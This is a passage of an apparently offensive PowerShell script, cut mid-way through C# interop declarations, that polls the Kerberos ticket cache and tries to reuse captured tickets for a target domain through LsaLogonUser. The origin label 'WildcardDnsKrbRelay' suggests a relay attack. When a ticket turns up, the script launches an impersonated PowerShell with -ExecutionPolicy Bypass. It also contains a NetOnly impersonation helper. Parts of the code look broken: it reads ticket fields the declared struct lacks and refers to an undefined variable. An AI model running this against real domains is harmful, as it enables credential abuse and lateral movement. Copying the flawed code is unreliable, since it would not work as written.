        public KERB_PROFILE_BUFFER_TYPE MessageType;
        public ushort LogonCount;
        public ushort BadPasswordCount;
        public long LogonTime;
        public long LogoffTime;
        public long KickOffTime;
        public long PasswordLastSet;
        public long PasswordCanChange;
        public long PasswordMustChange;
        public UNICODE_STRING LogonScript;
        public UNICODE_STRING HomeDirectory;
        public UNICODE_STRING FullName;
        public UNICODE_STRING ProfilePath;
        public UNICODE_STRING HomeDirectoryDrive;
        public UNICODE_STRING LogonServer;
        public uint UserFlags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_TICKET_PROFILE {
        public KERB_INTERACTIVE_PROFILE Profile;
        public KERB_CRYPTO_KEY SessionKey;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_TICKET_UNLOCK_LOGON {
        public KERB_TICKET_LOGON Logon;
        public LUID LogonId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_S4U_LOGON {
        public KERB_LOGON_SUBMIT_TYPE MessageType;
        public ulong flags;
        public UNICODE_STRING ClientUpn;
        public UNICODE_STRING ClientRealm;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_REQUEST {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID LogonId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_TICKET_CACHE_INFO {
        public UNICODE_STRING ServerName;
        public UNICODE_STRING RealmName;
        public long StartTime;
        public long EndTime;
        public long RenewTime;
        public uint EncryptionType;
        public uint TicketFlags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_RESPONSE {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public uint TicketCount;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public KERB_TICKET_CACHE_INFO[] Tickets;
    }

    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref UNICODE_STRING PackageName, out uint AuthenticationPackage);

    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int LsaCallAuthenticationPackage(
        IntPtr LsaHandle,
        uint AuthenticationPackage,
        IntPtr ProtocolSubmitBuffer,
        uint SubmitBufferLength,
        out IntPtr ProtocolReturnBuffer,
        out uint ReturnBufferLength,
        out int ProtocolStatus
    );

    public enum SECURITY_LOGON_TYPE : int {
        Interactive = 2,
        Network = 3,
        Batch = 4,
        Service = 5,
        Proxy = 6,
        Unlock = 7,
        NetworkCleartext = 8,
        NewCredentials = 9,
        RemoteInteractive = 10,
        CachedInteractive = 11,
        CachedRemoteInteractive = 12,
        CachedUnlock = 13
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct TOKEN_SOURCE {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] SourceName;
        public LUID SourceIdentifier;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct QUOTA_LIMITS {
        public uint PagedPoolLimit;
        public uint NonPagedPoolLimit;
        public uint MinimumWorkingSetSize;
        public uint MaximumWorkingSetSize;
        public uint PagefileLimit;
        public long TimeLimit;
    }

    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int LsaLogonUser(
        IntPtr LsaHandle,
        ref UNICODE_STRING OriginName,
        SECURITY_LOGON_TYPE LogonType,
        uint AuthenticationPackage,
        IntPtr AuthenticationInformation,
        uint AuthenticationInformationLength,
        IntPtr LocalGroups,
        ref TOKEN_SOURCE SourceContext,
        out IntPtr ProfileBuffer,
        out uint ProfileBufferLength,
        out LUID LogonId,
        out IntPtr Token,
        out QUOTA_LIMITS Quotas,
        out int SubStatus
    );
}
"@
    $krbStructs = Add-Type -TypeDefinition $signature -Namespace KerberosAuth -PassThru

    # 1. Use LsaConnectUntrusted to get a handle to the LSA
    $lsaHandle = [IntPtr]::Zero
    $result = [KerberosAuth]::LsaConnectUntrusted([ref]$lsaHandle)
    if ($result -ne 0) {
        Write-Error "LsaConnectUntrusted failed with error code: $result"
        return
    }

    # 2. Use LsaLookupAuthenticationPackage to get the package ID for Kerberos
    $kerberosPackageName = New-Object KerberosAuth.UNICODE_STRING
    $kerberosPackageName.Buffer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("Kerberos")
    $kerberosPackageName.Length = [System.Text.Encoding]::Unicode.GetByteCount("Kerberos")
    $kerberosPackageName.MaximumLength = $kerberosPackageName.Length + [System.Text.Encoding]::Unicode.GetByteCount([char]0)

    $kerberosPackageId = 0
    $result = [KerberosAuth]::LsaLookupAuthenticationPackage($lsaHandle, [ref]$kerberosPackageName, [ref]$kerberosPackageId)
    if ($result -ne 0) {
        Write-Error "LsaLookupAuthenticationPackage failed with error code: $result"
        return
    }

    # 3. Listen for incoming TGTs. If found, use `Invoke-PSNetOnly` to create a new logon session with the ticket
    while ($true) {
        # 1. Use LsaCallAuthenticationPackage to initialize a KERB_QUERY_TKT_CACHE_REQUEST
        $queryRequest = New-Object KerberosAuth.KERB_QUERY_TKT_CACHE_REQUEST
        $queryRequest.MessageType = [KerberosAuth.KERB_PROTOCOL_MESSAGE_TYPE]::KerbQueryTicketCacheMessage
        $queryRequest.LogonId = 0 # Query the current session
        $queryRequestSize = [System.Runtime.InteropServices.Marshal]::SizeOf($queryRequest)
        $queryRequestPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($queryRequestSize)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($queryRequest, $queryRequestPtr, $false)

        $responsePtr = [IntPtr]::Zero
        $responseSize = 0
        $protocolStatus = 0
        $result = [KerberosAuth]::LsaCallAuthenticationPackage(
            $lsaHandle,
            $kerberosPackageId,
            $queryRequestPtr,
            [uint32]$queryRequestSize,
            [ref]$responsePtr,
            [ref]$responseSize,
            [ref]$protocolStatus
        )
        
        if ($result -ne 0) {
            Write-Error "LsaCallAuthenticationPackage failed with error code: $result"
            continue
        }

        if ($protocolStatus -ne 0) {
            Write-Error "Kerberos query failed with protocol status: $protocolStatus"
            continue
        }

        # 2. If the response contains a ticket for the target domain, create a new logon session with the ticket
        $response = [System.Runtime.InteropServices.Marshal]::PtrToStructure($responsePtr, [Type][KerberosAuth.KERB_QUERY_TKT_CACHE_RESPONSE])
        if ($response.TicketCount -gt 0) {
            foreach ($ticket in $response.Tickets) {
                if ($ticket.ServerName.Buffer -like "*$TargetDomain*") {
                    Write-Host "Found ticket for $($ticket.ServerName.Buffer) in domain $($ticket.RealmName.Buffer)" -ForegroundColor Green

                    # Reuse some code from `Invoke-PSNetOnly` to launch a new PowerShell process with the impersonated token
                    $block = {
                        param(
                            [string]$Signature
                        )

                        Add-Type -TypeDefinition $signature -Namespace KerberosAuth

                        # Use LsaLogonUser to create a new logon session with logon type 9 and KERB_TICKET_LOGON
                        $TicketLogon = New-Object KerberosAuth.KERB_TICKET_LOGON

                        $TicketLogon.MessageType = [KerberosAuth.KERB_LOGON_SUBMIT_TYPE]::KerbTicketLogon
                        $TicketLogon.ServiceTicketLength = $ticket.EncodedTicketSize
                        $TicketLogon.ServiceTicket = $ticket.EncodedTicket
                        $TicketLogon.TicketGrantingTicketLength = 0
                        $TicketLogon.TicketGrantingTicket = [IntPtr]::Zero
                        $ticketLogonSize = [System.Runtime.InteropServices.Marshal]::SizeOf($TicketLogon)
                        $ticketLogonPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ticketLogonSize)
                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TicketLogon, $ticketLogonPtr, $false)
                        $originName = New-Object KerberosAuth.UNICODE_STRING
                        $originName.Buffer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("WildcardDnsKrbRelay")
                        $originName.Length = [System.Text.Encoding]::Unicode.GetByteCount("WildcardDnsKrbRelay")
                        $originName.MaximumLength = $originName.Length + [System.Text.Encoding]::Unicode.GetByteCount([char]0)
                        $token = [IntPtr]::Zero
                        $profileBuffer = [IntPtr]::Zero
                        $profileBufferLength = 0
                        $logonId = New-Object KerberosAuth.LUID
                        $quotas = New-Object KerberosAuth.QUOTA_LIMITS
                        $subStatus = 0

                        $result = [KerberosAuth]::LsaLogonUser(
                            $lsaHandle,
                            [ref]$originName,
                            [KerberosAuth.SECURITY_LOGON_TYPE]::NewCredentials,
                            $kerberosPackageId,
                            $ticketLogonPtr,
                            [uint32]$ticketLogonSize,
                            [IntPtr]::Zero,
                            [ref](New-Object KerberosAuth.TOKEN_SOURCE),
                            [ref]$profileBuffer,
                            [ref]$profileBufferLength,
                            [ref]$logonId,
                            [ref]$token,
                            [ref]$quotas,
                            [ref]$subStatus
                        )

                        if ($result -ne 0) {
                            Write-Error "LsaLogonUser failed with error code: $result"
                            continue
                        }

                        if ($subStatus -ne 0) {
                            Write-Error "LsaLogonUser failed with sub status: $subStatus"
                            continue
                        }
                        
                        Write-Host "Successfully logged on with ticket, token handle: $token. Attempting to launch new PowerShell process with impersonated token..." -ForegroundColor Green

                        $advapi32 = Add-Type -MemberDefinition $TypeDefinition -Name "Win32Logon" -Namespace "Win32" -PassThru

                        $identity = New-Object System.Security.Principal.WindowsIdentity($token)
                        $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)

                        [System.Threading.Thread]::CurrentPrincipal = $principal
                        [System.Security.Principal.WindowsIdentity]::RunImpersonated($identity.AccessToken, {
                            Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass"
                        })

                        $advapi32::CloseHandle($Token)
                        
                        # Free the ticket logon buffer after we're done with it
                        if ($ticketLogonPtr -ne [IntPtr]::Zero) {
                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ticketLogonPtr)
                        }
                    }

                    Start-Job -ScriptBlock $block -ArgumentList "-Signature $signature"
                }
            }
        }

        # Wait 5 seconds before querying again to avoid high CPU usage
        Start-Sleep -Seconds 5

        # Free the response buffer after processing
        if ($responsePtr -ne [IntPtr]::Zero) {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($responsePtr)
        }
    }
}

<#
.SYNOPSIS
Impersonates a user and launches a new PowerShell process with their credentials.

.DESCRIPTION
Uses Win32 API calls to perform user impersonation via the LogonUser function.
Launches a new PowerShell process running as the specified user without fully switching
the user context (NetOnly authentication). Useful for accessing network resources with
different credentials while maintaining the current user's local session.

.PARAMETER Credential
PSCredential object containing the username and password to impersonate.

.EXAMPLE
$cred = Get-Credential "domain\username"
Invoke-PSNetOnly -Credential $cred
Launches a new PowerShell process impersonating the specified user.

.NOTES
Uses Win32 API: LogonUser with LOGON32_LOGON_NEW_CREDENTIALS (9).
Creates a background job to handle the impersonation.
The new PowerShell process inherits the impersonated user's network credentials.
WARNING: Requires proper error handling as LogonUser failures are reported but may not block execution.

.INPUTS
System.Management.Automation.PSCredential

.OUTPUTS
System.Management.Automation.Job for the background process.
#>
function Invoke-PSNetOnly {
    param(
        [Parameter(Mandatory=$true)]
        [System.Management.Automation.PSCredential]$Credential
    )

    $signature = @"
    using System;
    using System.Runtime.InteropServices;

    public class Win32 {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
"@

    # Compile the Win32 functions
    if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
        Add-Type -TypeDefinition $signature
    }

    $token = [IntPtr]::Zero
    $netCred = $Credential.GetNetworkCredential()

    # Logon Type 9: LOGON32_LOGON_NEW_CREDENTIALS
    # Logon Provider 0: LOGON32_PROVIDER_DEFAULT
    $success = [Win32]::LogonUser(
        $netCred.UserName, 
        $netCred.Domain, 
        $netCred.Password, 
        9, 
        0, 
        [ref]$token
    )

    if ($success) {
        try {
            # Use .NET's built-in Impersonation wrapper
            [System.Security.Principal.WindowsIdentity]::RunImpersonated([System.Runtime.InteropServices.SafeHandle]($token), {
                # Launch the new process while impersonating
                Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -NoExit -Command '`$Host.UI.RawUI.WindowTitle = `'NetOnly: $($netCred.UserName)`'"
            })
            Write-Host "Successfully launched PowerShell with NetOnly credentials." -ForegroundColor Green
        }
        finally {
            # Always close the handle
            [void][Win32]::CloseHandle($token)
        }
    } else {
        $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "LogonUser failed with error code: $errorCode"
    }
}